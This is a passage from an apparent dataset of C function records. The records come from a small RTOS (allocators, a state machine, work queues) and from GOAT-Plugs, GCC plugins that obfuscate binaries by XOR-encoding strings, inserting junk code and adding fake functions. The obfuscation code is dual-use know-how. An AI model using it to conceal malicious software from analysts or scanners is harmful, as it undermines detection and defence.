"jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void *mem_1_alloc(size_t xWantedSize)", "code": "{\n\tvoid *pvReturn = NULL;\n\tstatic unsigned char *pucAlignedHeap = NULL;\n\n\t/* Ensure that blocks are always aligned to the required number of bytes. */\n\t#if portBYTE_ALIGNMENT != 1\n\t\tif( xWantedSize & portBYTE_ALIGNMENT_MASK )\n\t\t{\n\t\t\t/* Byte alignment required. */\n\t\t\txWantedSize += ( portBYTE_ALIGNMENT - ( xWantedSize & portBYTE_ALIGNMENT_MASK ) );\n\t\t}\n\t#endif\n\n\traw_disable_sche();\n\t{\n\t\tif( pucAlignedHeap == NULL )\n\t\t{\n\t\t\t/* Ensure the heap starts on a correctly aligned boundary. */\n\t\t\tpucAlignedHeap = ( unsigned char * ) ( ( ( portPOINTER_SIZE_TYPE ) &ucHeap[ portBYTE_ALIGNMENT ] ) & ( ( portPOINTER_SIZE_TYPE ) ~portBYTE_ALIGNMENT_MASK ) );\n\t\t}\n\n\t\t/* Check there is enough room left for the allocation. */\n\t\tif( ( ( xNextFreeByte + xWantedSize ) < configADJUSTED_HEAP_SIZE ) &&\n\t\t\t( ( xNextFreeByte + xWantedSize ) > xNextFreeByte )\t)/* Check for overflow. */\n\t\t{\n\t\t\t/* Return the next free byte then increment the index past this\n\t\t\tblock. */\n\t\t\tpvReturn = pucAlignedHeap + xNextFreeByte;\n\t\t\txNextFreeByte += xWantedSize;\n\t\t}\n\n\t\t\n\t}\n\t\n\traw_enable_sche();\n\n\treturn pvReturn;\n}", "path": "extension\\mm\\heap_1.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                   Exceute the hsm state machine\n*\n* Description: This function is used to exceute the hsm state machine.\n*\n* Arguments  :me is the state machine\n*                    ---------\n*                    e is the trig event   \n*\t\t\t\t         \n* Returns\t\t\t\n*\t\t\t\t\t\t\n* Note(s)    \t\n*\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "void hsm_exceute(STM_STRUCT *me, STATE_EVENT *e)", "code": "{\n\tstm_state_handler s;\n\tRAW_U16 r;\n\tRAW_S8 ip;\n\tRAW_S8 iq;\n\t\n\tstm_state_handler path[STM_MAX_NEST_DEPTH];\n\t\n    stm_state_handler t = me->state;\n\n \t/*state must be stable here*/\n\tif (t != me->temp) {\n\n\t\tRAW_ASSERT(0);\n\t}\n\n    \n    do {                             \n        s = me->temp;\n\n\t\t/*exceute the state function with new event*/\n        r = (*s)(me, e);                         \n\n        if (r == STM_RET_UNHANDLED) {           \n\t\t\t/*Move up to father state*/\n            r = STM_TRIG(s, STM_EMPTY_SIG);       \n        }\n\n\t/*move up to the father state to find suitable state to handle the sig*/\n    } while (r == STM_RET_FATHER);\n\n\t/*if state transition happened then process it*/\n    if (r == STM_RET_TRAN) {                            \n       \n        ip = -1;  \n\t\t\n\t\t/*save the transitioned state*/\n        path[0] = me->temp;            \n        path[1] = t;\n\n\t\t/*t is the source state, and s is the state which cause new state change*/\n\t\t/*for example s is the father state of t*/\n        while (t != s) {  \n\n\t\t\t/*if STM_EXIT_SIG is handled, trig STM_EMPTY_SIG to find the father state*/ \n\t\t\t/*if STM_EXIT_SIG not handled , then me->temp hold the father state*/\n            if (STM_TRIG(t, STM_EXIT_SIG) == STM_RET_HANDLED) {\n                \n            \tSTM_TRIG(t, STM_EMPTY_SIG);\n            }\n\n\t\t\t/*move t to one father state up*/\n            t = me->temp;                 \n        }\n\n\t\t/*t is the target transition state*/\n        t = path[0];                           \n\n\t\t/*all the following code is try to find the LCA and exit from the source state to LCA state*/\n\t\t/*Be careful LCA state is either not entered not exited.*/\n\t\t/*all the father state of the target transition state is stored to path from hight to low etc, path[0] is the target transition state*/\n\t\t\n        if (s == t) {      \n            STM_EXIT(s);                                \n            ip = 0;                            \n        }\n        else {\n        \tSTM_TRIG(t, STM_EMPTY_SIG);     \n\n            t = me->temp;\n            if (s == t) {                \n                ip = 0;                        \n            }\n\t\t\t\n            else {\n            \tSTM_TRIG(s, STM_EMPTY_SIG);    \n                \n                if (me->temp == t) {\n                    STM_EXIT(s);                        \n                    ip = 0;                   \n                }\n\t\t\t\t\n                else {\n                                         \n                    if (me->temp == path[0]) {\n                        STM_EXIT(s);                    \n                    }\n\t\t\t\t\t\n                    else {\n                        iq = 0;      \n                        ip = 1;  \n                        path[1] = t;      \n                        t = me->temp;                 \n                                              \n                        r = STM_TRIG(path[1], STM_EMPTY_SIG);\n\t\t\t\t\t\t\t\t\t\t\t   \n                        while (r == STM_RET_FATHER) {\n                            ++ip;\n                            path[ip] = me->temp;    \n                            if (me->temp == s) {      \n                                iq = 1;  \n                                            \n\t\t\t\t\t\t\t\tif (ip >= STM_MAX_NEST_DEPTH) {\n\n\t\t\t\t\t\t\t\t\tRAW_ASSERT(0);\n\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n                                --ip;           \n                                r = STM_RET_HANDLED;    \n                            }\n                            else {  \n                                r = STM_TRIG(me->temp, STM_EMPTY_SIG);\n                            }\n                        }\n\t\t\t\t\t\t\n                        if (iq == 0) {   \n             \n\t\t\t\t\t\t\tif (ip >= STM_MAX_NEST_DEPTH) {\n\n\t\t\t\t\t\t\t\tRAW_ASSERT(0);\n\n\t\t\t\t\t\t\t}\n\n                            STM_EXIT(s);               \n\n                     \n                            iq = ip;\n                            r = STM_RET_IGNORED;    \n                            do {\n                                if (t == path[iq]) {   \n                                    r = STM_RET_HANDLED;\n                                                         \n                                    ip = iq - 1;\n                                    iq = -1;\n                                }\n                                else {\n                                    --iq; \n                                }\n                            } while (iq >= 0);\n\n                            if (r != STM_RET_HANDLED) { \n                                   \n                                r = STM_RET_IGNORED;         \n                                do {\n                                                      \n                                    if (STM_TRIG(t, STM_EXIT_SIG) == STM_RET_HANDLED) {\n\t\t\t\t\t\t\t\t\t\tSTM_TRIG(t, STM_EMPTY_SIG);\n                                    }\n\t\t\t\t\t\t\t\t\t\n                                    t = me->temp;    \n                                    iq = ip;\n                                    do {\n                                        if (t == path[iq]) {\n                                                       \n                                            ip = iq - 1;\n                                            iq = -1;\n                                            r = STM_RET_HANDLED;\n                                        }\n                                        else {\n                                            --iq;\n                                        }\n                                    } while (iq >= 0);\n                                } while (r != STM_RET_HANDLED);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n\n\t\t/*trig STM_ENTRY_SIG from LCA to transioned state*/\n        for (; ip >= 0; --ip) {\n            STM_ENTER(path[ip]);                        \n        }\n\t\t\n        t = path[0];                     \n        me->temp = t;                            \n\n\t\t/*trig the STM_INIT_SIG to the new transitioned state, if new transion happened again, then we need do it again*/\n\t\t/*Becareful STM_INIT_SIG must trig t state to the nested children state, otherwise hsm crash*/\n        while (STM_TRIG(t, STM_INIT_SIG) == STM_RET_TRAN) {\n\n\t\t\tip = 0;\n\t\t\tpath[0] = me->temp;\n\n\t\t\t/*Find all the father state until to source t state */\n\t\t\tSTM_TRIG(me->temp, STM_EMPTY_SIG);   \n\n\t\t\twhile (me->temp != t) {\n\t\t\t\t++ip;\n\t\t\t\tpath[ip] = me->temp;\n\t\t\t\tSTM_TRIG(me->temp, STM_EMPTY_SIG);\n\t\t\t}\n\n\t\t\tme->temp = path[0];\n\t\t\t                            \n\t\t\tif (ip >= STM_MAX_NEST_DEPTH) {\n\n\t\t\t\tRAW_ASSERT(0);\n\n\t\t\t}\n\n\t\t\t/*trig STM_ENTRY_SIG from father source state to nested transition children state*/\n\t\t\tdo {   \n\t\t\t\tSTM_ENTER(path[ip]);                     \n\t\t\t\t--ip;\n\t\t\t} while (ip >= 0);\n\n\t\t\t/*remember the target transitoned state*/\n\t\t\tt = path[0];\n\t\t\t\n\t\t}\n\n\n\t}\n   \n\t/*change to new state*/\n\tme->state = t;                       \n\tme->temp  = t; \n\t\n}", "path": "raw_stm.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                       Schedule the specific work queue\n*\n* Description: This function is called to schedule the specific work queue\n*\n* Arguments  :wq is the address of the work queue object\n*                    -----\n*                    arg is the argument passed to the handler\n*\t               -----\n*                    msg is the message passed to the handler\n*\t\t\t\t         \n* Returns   : RAW_SUCCESS\n*                  RAW_WORK_QUEUE_MSG_MAX: need more work_queue_internal_msg.\n*                  RAW_MSG_MAX:queue is full.\n*\n* Note(s)  :   This API can be called by interrupt or task.  \n*\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "RAW_OS_ERROR sche_work_queue(WORK_QUEUE_STRUCT *wq, RAW_U32 arg, void *msg, WORK_QUEUE_HANDLER handler)", "code": "{\n\tOBJECT_WORK_QUEUE_MSG *msg_data;\n\tRAW_OS_ERROR ret;\n\n\tRAW_SR_ALLOC();\n\n\tRAW_CPU_DISABLE();\n\t\n\tif (free_work_queue_msg == 0) {\n\t\t\n\t\tRAW_CPU_ENABLE();\n\t\t\n\t\treturn RAW_WORK_QUEUE_MSG_MAX;\n\t}\n\n\tmsg_data = free_work_queue_msg;\n\n\tfree_work_queue_msg->arg = arg;\n\tfree_work_queue_msg->msg = msg;\n\tfree_work_queue_msg->handler = handler;\n\t\n\tfree_work_queue_msg = free_work_queue_msg->next;\n\n\tRAW_CPU_ENABLE();\n\t\n\tret = raw_queue_end_post(&wq->queue, msg_data);\n\n\tif (ret == RAW_SUCCESS) {\n\n\t}\n\n\telse {\n\n\t\tRAW_CPU_DISABLE();\n\t\tmsg_data->next = free_work_queue_msg;\n\t\tfree_work_queue_msg = msg_data;\n\t\tRAW_CPU_ENABLE();\t\n\t}\n\t\t\n\treturn ret;\n}", "path": "extension\\lib\\raw_work_queue.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                       Init work queue system\n*\n* Description: This function is called to init the work queue system\n*\n* Arguments  :NONE\n*                \t -----\n*                \n*\t\t\t\t         \n*\t\t\t\t         \n* Returns  :NONE\n*\n* Note(s)    :This function should be called before using any work queue API.\n*\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "void global_work_queue_init(OBJECT_WORK_QUEUE_MSG *work_queue_msg, RAW_U32 size)", "code": "{\n\tOBJECT_WORK_QUEUE_MSG *p_msg1;\n\tOBJECT_WORK_QUEUE_MSG *p_msg2;\n\n\twork_queue_msg_size = size;\n\tfree_work_queue_msg = work_queue_msg;\n\t\n\t/*init the free msg list*/\n\tp_msg1 = work_queue_msg;\n\tp_msg2 = work_queue_msg;\n\tp_msg2++;\n\n\twhile (--size) { \n\n\t\tp_msg1->next = p_msg2;\n\n\t\tp_msg1++;\n\t\tp_msg2++;\n\t}\n\n\t/*init  the last free msg*/ \n\tp_msg1->next = 0;                      \n\t\n}", "path": "extension\\lib\\raw_work_queue.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/*\n************************************************************************************************************************\n*                                       Timer tick function\n*\n* Description: This function is called by timer interrupt.\n*\n* Arguments  :None\n*                \n*                 \n*\n*\t\t\t\t         \n* Returns\t\t None\n*\t\t\t\t\t\t\n* Note(s)    Called by your own timer interrupt.\n*\n*             \n************************************************************************************************************************\n*/\n", "func_signal": "void raw_time_tick(void)", "code": "{\n\t#if (CONFIG_RAW_USER_HOOK > 0)\n\traw_tick_hook();\n\t#endif\n\n\t/*update system time to calculate whether task timeout happens*/\n\t#if (CONFIG_RAW_TICK_TASK > 0)\n\traw_task_semaphore_put(&tick_task_obj);\n\t#else\n\ttick_list_update();\n\t#endif\n\n\t/*update task time slice if possible*/\n\t#if (CONFIG_SCHED_FIFO_RR > 0)\n\tcalculate_time_slice(raw_task_active->priority);\n\t#endif\n\n\t/*inform the timer task to update software timer*/\t\n\t#if (CONFIG_RAW_TIMER > 0)\n\tcall_timer_task();\n\t#endif\n\t\n}", "path": "raw_system.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/** Allocate PARTICULAR block from buddy system.\n *\n * @return\t\tBlock of data or NULL if no such block was found.\n */\n", "func_signal": "link_t *buddy_system_alloc_block(buddy_system_t *b, link_t *block)", "code": "{\n\tlink_t *left,*right, *tmp;\n\tRAW_U8 order;\n\n\tleft = b->op->find_block(b, block, BUDDY_SYSTEM_INNER_BLOCK);\n\tASSERT(left);\n\tlist_remove(left);\n\twhile (1) {\n\t\tif (!b->op->get_order(b, left)) {\n\t\t\tb->op->mark_busy(b, left);\n\t\t\treturn left;\n\t\t}\n\t\t\n\t\torder = b->op->get_order(b, left);\n\n\t\tright = b->op->bisect(b, left);\n\t\tb->op->set_order(b, left, order - 1);\n\t\tb->op->set_order(b, right, order - 1);\n\n\t\ttmp = b->op->find_block(b, block, BUDDY_SYSTEM_INNER_BLOCK);\n\n\t\tif (tmp == right) {\n\t\t\tright = left;\n\t\t\tleft = tmp;\n\t\t} \n\t\tASSERT(tmp == left);\n\t\tb->op->mark_busy(b, left);\n\t\tbuddy_system_free(b, right);\n\t\tb->op->mark_available(b, left);\n\t}\n}", "path": "extension\\mm\\slab\\raw_buddy.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/** Check if buddy system can allocate block.\n *\n * @param b\t\tBuddy system pointer.\n * @param i\t\tSize of the block (2^i).\n *\n * @return\t\tTrue if block can be allocated.\n */\n", "func_signal": "bool buddy_system_can_alloc(buddy_system_t *b, RAW_U8 i)", "code": "{\n\tRAW_U8 k;\n\t\n\t/*\n\t * If requested block is greater then maximal block\n\t * we know immediatly that we cannot satisfy the request.\n\t */\n\n\tif (i > b->max_order)\n\t\treturn false;\n\n\t/*\n\t * Check if any bigger or equal order has free elements\n\t */\n\tfor (k = i; k <= b->max_order; k++) {\n\t\tif (!list_empty(&b->order[k])) {\n\t\t\treturn true;\n\t\t}\n\t}\n\t\n\treturn false;\n}", "path": "extension\\mm\\slab\\raw_buddy.c", "repo_name": "jorya/raw-os", "stars": 77, "license": "lgpl-3.0", "language": "c", "size": 824}
{"docstring": "/* Returns true if this function has been ignored */\n", "func_signal": "static bool ignore_fn(tree decl)", "code": "{\n    tree fn;\n    unsigned ii;\n\n    FOR_EACH_VEC_ELT(ignorez, ii, fn)\n      if (fn == decl)\n          return true;\n\n    return false;\n}", "path": "nopper\\nopper.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* TODO: The compiler will remove much junk, use the jpanic plugin instead\nstatic tree gen_junk(void)\n{\n    unsigned i;\n    char name[8] = {0};\n    tree stmts = NULL_TREE, stmt;\n\n    for (i=0; i<5; ++i)\n    {\n        snprintf(name, 7, \"foo%d\", i);\n        tree tmp = create_tmp_var(integer_type_node, name);\n        stmt = build1(DECL_EXPR, void_type_node, tmp);\n        append_to_statement_list(stmt, &stmts);\n    }\n\n    return stmts;\n}\n*/\n", "func_signal": "static tree build_junk_fn(unsigned id)", "code": "{\n    char fnname[32] = {0};\n    tree decl, resdecl, initial, proto;\n\n    /* Func decl */\n    snprintf(fnname, 31, \"__func%d\", id);\n    proto = build_varargs_function_type_list(void_type_node, NULL_TREE);\n    decl = build_fn_decl(fnname, proto);\n    SET_DECL_ASSEMBLER_NAME(decl, get_identifier(fnname));\n    \n    printf(TAG \"Creating junk function: %s\\n\", fnname);\n   \n    /* Result */ \n    resdecl=build_decl(BUILTINS_LOCATION,RESULT_DECL,NULL_TREE,void_type_node);\n    DECL_ARTIFICIAL(resdecl) = 1;\n    DECL_CONTEXT(resdecl) = decl;\n    DECL_RESULT(decl) = resdecl;\n    \n    /* Initial */\n    initial = make_node(BLOCK);\n    TREE_USED(initial) = 1;\n    DECL_INITIAL(decl) = initial;\n    DECL_UNINLINABLE(decl) = 1;\n    DECL_EXTERNAL(decl) = 0;\n    DECL_PRESERVE_P(decl) = 1;\n\n    /* Func decl */\n    TREE_USED(decl) = 1;\n    TREE_PUBLIC(decl) = 1;\n    TREE_STATIC(decl) = 1;\n    DECL_ARTIFICIAL(decl) = 1;\n\n    /* Make the function */\n    push_struct_function(decl);\n    /* DECL_SAVED_TREE(decl) = gen_junk(); */\n    cfun->function_end_locus = BUILTINS_LOCATION;\n    gimplify_function_tree(decl);\n\n    /* Update */\n    cgraph_add_new_function(decl, false);\n    cgraph_mark_needed_node(cgraph_node(decl));\n    current_function_decl = NULL_TREE;\n    pop_cfun();\n\n    return decl;\n}", "path": "slimer\\slimer.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Algo to encode a readonly string: xor with -1 (thanks Robert Morris) */\n", "func_signal": "static void encode(tree node)", "code": "{\n    int ii;\n    encdec_t ed;\n\n    /* Do no encode the data if we already have */\n    FOR_EACH_VEC_ELT(readonlyz, ii, ed)\n      if (ed->strcst == node)\n        return;\n\n    for (ii=0; ii<TREE_STRING_LENGTH(node); ++ii)\n      ((char *)TREE_STRING_POINTER(node))[ii] =\n        TREE_STRING_POINTER(node)[ii] ^ -1;\n}", "path": "munger\\munger.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Locate read only string constants */\n", "func_signal": "static void process_readonlys(gimple stmt)", "code": "{\n    unsigned i;\n    gimple assign_global;\n    gimple_stmt_iterator gsi;\n    tree op, decoded_op, orig, decoded_var, lhs;\n\n    /* For each operand in stmt */\n    for (i=0; i<gimple_num_ops(stmt); ++i)\n    {\n        if (!(op = gimple_op(stmt, i)))\n          continue;\n\n        /* Store the base type and trace through the node until we find the\n         * string type, if it even is a string constant.\n         */\n        orig = op;\n        if (!(op = get_str_cst(op)))\n          continue;\n\n        /* Encode the data */\n        encode(op);\n\n        /* Only store this guy once and return the value we emit into the binary\n         * as the decoded version.\n         */\n        decoded_op = add_unique(op);\n\n        /* Create a ssa instance of a variable that we put the global into */\n        decoded_var = create_tmp_var(ptr_type_node, \"MUNGER_ARG\");\n        decoded_var = make_ssa_name(decoded_var, stmt);\n\n        /* Assign the global to the ssa name instance */\n        assign_global = gimple_build_assign_stat(decoded_var, decoded_op);\n        gsi = gsi_for_stmt(stmt);\n        gsi_insert_before(&gsi, assign_global, GSI_NEW_STMT);\n\n        /* Set the global which points to the decoded  data and forget it... */\n        lhs = insert_decode_bn(stmt, decoded_var, orig);\n        gimple_set_op(stmt, i, lhs);\n        update_stmt(stmt);\n    }\n}", "path": "munger\\munger.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* lhs = rhs1 OP rhs2 */\n", "func_signal": "static gimple build_junk_math(junk_type_e op)", "code": "{\n    tree rhs1, rhs2;\n    enum tree_code code;\n\n    if (op == JUNK_ADD)\n      code = PLUS_EXPR;\n    else if (op == JUNK_SUB)\n      code = MINUS_EXPR;\n    else /* (op == JUNK_MUL) */\n      code = MULT_EXPR;\n\n    rhs1 = create_tmp_var(integer_type_node, \"_junk\");\n    rhs1 = make_ssa_name(rhs1, gimple_build_nop());\n    DECL_ARTIFICIAL(rhs1) = 1;\n    TREE_THIS_VOLATILE(rhs1) = 1;\n    DECL_PRESERVE_P(rhs1) = 1;\n\n    rhs2 = create_tmp_var(integer_type_node, \"_junk\");\n    rhs2 = make_ssa_name(rhs2, gimple_build_nop());\n    DECL_ARTIFICIAL(rhs2) = 1;\n    TREE_THIS_VOLATILE(rhs2) = 1;\n    DECL_PRESERVE_P(rhs2) = 1;\n\n    return gimple_build_assign_with_ops(code, jpanic, rhs1, rhs2);\n}", "path": "jpanic\\jpanic.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Find the STRING_CST node stashed in node */\n", "func_signal": "static tree get_str_cst(tree node)", "code": "{\n    tree str;\n\n    str = node;\n\n    /* Filter out types we are ignoring */\n    if (TREE_CODE(node) == VAR_DECL)\n    {\n        if (!(str = DECL_INITIAL(node))) /* nop expr  */\n          return NULL_TREE;\n        else if (TREE_CODE(str) == INTEGER_CST) /* Ignore single chars */\n          return NULL_TREE;\n\n        str = TREE_OPERAND(str, 0); /* addr expr */\n    }\n    else if (TREE_CODE(node) == ADDR_EXPR)\n      str = TREE_OPERAND(str, 0);\n\n    if (!str)\n      return NULL_TREE;\n\n    /* We only deal with readonly stuff */\n    if (!TYPE_READONLY(str) && (TREE_CODE(str) != ARRAY_REF))\n      return NULL_TREE;\n   \n    if (TREE_OPERAND_LENGTH(str) > 0 && TREE_CODE(str) != STRING_CST)\n      str = TREE_OPERAND(str, 0);\n\n    if (TREE_CODE(str) != STRING_CST)\n      return NULL_TREE;\n    else {\n      return str;\n    }\n}", "path": "munger\\munger.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Returns 'true' if we have already processed the function */\n", "func_signal": "static bool has_been_processed(tree fndecl)", "code": "{\n    unsigned i;\n    tree decl;\n\n    /* If we have already analyized it, then return true */\n    FOR_EACH_VEC_ELT(tree, analyized_fns, i, decl)\n      if (decl == fndecl)\n        return true;\n\n    /* If it's a junk function, return true */\n    FOR_EACH_VEC_ELT(tree, fakes, i, decl)\n      if (decl == fndecl)\n        return true;\n\n    return false;\n}", "path": "slimer\\slimer.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Add 'node' to our vec of readonly vars */\n", "func_signal": "static tree add_unique(tree node)", "code": "{\n    unsigned ii;\n    tree dec_node;\n    encdec_t ed;\n\n    FOR_EACH_VEC_ELT (readonlyz, ii, ed)\n      if (ed->strcst == node)\n        return ed->dec_node;\n\n    /* Create a global variable, thanks to \"init_ic_make_global_vars()\" */\n    dec_node = build_decl(UNKNOWN_LOCATION, VAR_DECL, NULL_TREE, ptr_type_node);\n    DECL_NAME(dec_node) = create_tmp_var_name(\"MUNGER_GLOBAL\");\n    DECL_ARTIFICIAL(dec_node) = 1;\n    TREE_STATIC(dec_node) = 1;\n    varpool_finalize_decl(dec_node);\n\n    /* Remember the node */\n    ed = (encdec_t)xmalloc(sizeof(struct _encdec_d));\n    ed->dec_node = dec_node;\n    ed->strcst = get_str_cst(node);\n    readonlyz.safe_push(ed);\n\n    return dec_node;\n}", "path": "munger\\munger.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Returns 'true' if the function 'decl' is one we have added */\n", "func_signal": "static bool is_junk_fn(tree decl)", "code": "{\n    unsigned i;\n    tree junk;\n\n    FOR_EACH_VEC_ELT(junk_fns, i, junk)\n      if (junk == decl)\n        return true;\n\n    return false;\n}", "path": "jpanic\\jpanic.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Emit code which will call __decode()\n * Returns the lhs variable this function creates (decoded data).\n * This also sets the global\n */\n", "func_signal": "static tree insert_decode_bn(gimple stmt, tree lhs, tree arg)", "code": "{\n    unsigned ii;\n    gimple call;\n    gimple_stmt_iterator gsi;\n    encdec_t ed;\n    tree str, size_node;\n\n    /* Build a node to hold the size */\n    str = get_str_cst(arg);\n    size_node = build_int_cstu(uint32_type_node, TREE_STRING_LENGTH(str));\n\n    /* Build the call DECODED = __decode() */\n    call = gimple_build_call(test_decode_fndecl, 3, lhs, arg, size_node);;\n\n    /* Insert the code for the 'DECODED = __decode();' statement */\n    gsi = gsi_for_stmt(stmt);\n    gsi_insert_before(&gsi, call, GSI_NEW_STMT);\n\n    /* Get the global associated to the strcst */\n    FOR_EACH_VEC_ELT(readonlyz, ii, ed)\n      if (ed->strcst == str)\n        break;\n\n    /* Set the global to the decoded value (to avoid decoding multiple times) */\n    gimple_call_set_lhs(call, ed->dec_node);\n\n    /* Return the tmp variable which has the decoded value in it */\n    return ed->dec_node;\n}", "path": "munger\\munger.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* This is the plugin callback that gets triggered based on data specified in\n * the pass struct defined below.\n * Returns 0 on success, error otherwise\n */\n", "func_signal": "static unsigned int munger_exec(void)", "code": "{\n    basic_block bb;\n    gimple_stmt_iterator gsi;\n\n    init_builtins();\n\n    FOR_EACH_BB_FN(bb, cfun)\n      for (gsi=gsi_start_bb(bb); !gsi_end_p(gsi); gsi_next(&gsi))\n        process_readonlys(gsi_stmt(gsi));\n\n#ifdef GOAT_DEBUG\n    debug_function(current_function_decl, 0);\n#endif\n\n    return 0;\n}", "path": "munger\\munger.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Called once per function */\n", "func_signal": "static unsigned int jpanic_exec(void)", "code": "{\n    basic_block bb;\n    gimple stmt;\n    gimple_stmt_iterator gsi;\n    static bool initted;\n\n    if (!initted)\n    {\n        init_jpanic_global();\n        initted = true;\n    }\n\n    /* For each basic block ... for each statement ... if rand is true insert\n     * junk before the statement\n     */\n    FOR_EACH_BB_FN(bb, cfun)\n      for (gsi=gsi_start_bb(bb); !gsi_end_p(gsi); gsi_next(&gsi))\n        if ((max_junk > 0) && (rand() % 2 && max_junk))\n        {\n            stmt = create_junk_stmt();\n            gsi_insert_before(&gsi, stmt, GSI_NEW_STMT);\n            gsi_next(&gsi);\n\n            /* If this is a junk function, assign the return value to the global\n             * variable so that we make the junk actually get compiled in.  GCC\n             * is smart and doesn't want to compile in junk.\n             */\n            if (is_junk_fn(cfun->decl))\n            {\n                gsi_insert_before(&gsi, gimple_build_assign(DECL_RESULT(cfun->decl),\n                            jpanic), GSI_NEW_STMT);\n            }\n            --max_junk;\n        }\n\n#ifdef GOAT_DEBUG\n    debug_function(cfun->decl, 0); \n#endif\n\n    return 0;\n}", "path": "jpanic\\jpanic.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Insert a call to the runtime function \"__slimer_add_fn\" which will add the\n * \"junk\" function created at compile-time to an array at runtime\n */\n", "func_signal": "static void insert_add_fn(gimple stmt, int index)", "code": "{\n    tree fn;\n    gimple call;\n    gimple_stmt_iterator gsi;\n    static tree decl, proto, idx;\n\n    if (!decl || !proto)\n    {\n        proto = build_function_type_list(void_type_node, ptr_type_node,\n                                         integer_type_node, NULL_TREE);\n        decl = build_fn_decl(\"__slimer_add_fn\", proto);\n    \n        /* Add this fndecl to our list of things we do not process */\n        VEC_safe_push(tree, gc, analyized_fns, decl);\n    }\n\n    /* Create a constant value and pointer to the function we are to add */\n    idx = build_int_cst(integer_type_node, index);\n    fn = build_addr(VEC_index(tree, fakes, index), NULL_TREE);\n    call = gimple_build_call(decl, 2, fn, idx);\n    gsi = gsi_for_stmt(stmt);\n    gsi_insert_before(&gsi, call, GSI_NEW_STMT);\n}", "path": "slimer\\slimer.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Count the number of stmts in this program */\n", "func_signal": "static int count_stmts(void)", "code": "{\n    int n_stmts;\n    basic_block bb;\n    gimple_stmt_iterator gsi;\n    struct cgraph_node *node;\n    struct function *func;\n\n    n_stmts = 0;\n\n    /* For each call graph node, for each function, for each bb in func, for\n     * each stmt in bb\n     */\n    FOR_EACH_FUNCTION(node)\n    {\n        symtab_node *n = node;\n\n        if (ignore_fn(n->decl))\n          continue;\n\n        if (!(func = DECL_STRUCT_FUNCTION(n->decl)))\n          continue;\n\n        FOR_EACH_BB_FN(bb, func)\n          for (gsi=gsi_start_bb(bb); !gsi_end_p(gsi); gsi_next(&gsi))\n            ++n_stmts;\n    }\n\n    return n_stmts;\n}", "path": "nopper\\nopper.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Permit only gcc version 4.9 */\n", "func_signal": "static inline bool munger_version_check(const struct plugin_gcc_version *ver)", "code": "{\n    if ((strncmp(ver->basever, \"4.9\", strlen(\"4.9\")) == 0))\n      return true;\n\n    error(\"[GOAT-Plugs] The munger plugin is not supported for this version of \"\n          \"the compiler, try a 4.9.x series\");\n\n    return false;\n}", "path": "munger\\munger.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Return 0 on success or error code on failure */\n", "func_signal": "int plugin_init(struct plugin_name_args   *info,\n                struct plugin_gcc_version *ver)", "code": "{\n    unsigned i;\n    struct register_pass_info pass;\n\n    /* Version check */\n    if (strncmp(ver->basever, nopper_ver.basever, strlen(\"4.6\")))\n      return -1;\n\n    srand(time(NULL));\n\n    pass.pass = &slimer_pass.pass;\n    pass.reference_pass_name = \"ssa\";\n    pass.ref_pass_instance_number = 1;\n    pass.pos_op = PASS_POS_INSERT_AFTER;\n\n    register_callback(\"slimer\", PLUGIN_START_UNIT, &slimer_init_junk_fns, NULL);\n    register_callback(\"slimer\", PLUGIN_PASS_MANAGER_SETUP, NULL, &pass);\n    register_callback(\"slimer\", PLUGIN_INFO, NULL, &slimer_info);\n\n    /* Get the args */\n    for (i=0; i<info->argc; ++i)\n      if (strncmp(\"numfuncs\", info->argv[i].key, 8) == 0)\n        n_funcs = atoi(info->argv[i].value);\n      else if (strncmp(\"maxcalls\", info->argv[i].key, 8) == 0)\n        max_calls = atoi(info->argv[i].value);\n\n    /* If bad arguments, do nothing */\n    if (n_funcs < 0)\n      n_funcs = 0;\n\n    if (max_calls < 0 || n_funcs == 0)\n       max_calls = 0;\n\n   